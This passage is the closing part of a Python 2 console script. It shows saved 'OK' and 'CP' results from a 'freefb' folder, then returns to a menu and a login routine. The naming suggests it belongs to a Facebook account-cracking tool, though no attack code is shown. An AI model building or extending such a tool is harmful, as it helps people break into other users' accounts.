    print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Result OK "))
    try:
        os.system("cat freefb/ok.txt")
    except IOError:
        print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] No Result Found"))
    print(("\n\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] Result CP"))
    try:
        os.system("cat freefb/cp.txt")
    except IOError:
        print(("\033[0;96m\033[0;97m [\033[1;36m•\033[1;37m] No Result Found"))
    n = raw_input("\033[1;37m [BACK]")
    menu()


if __name__=="__main__":
    login()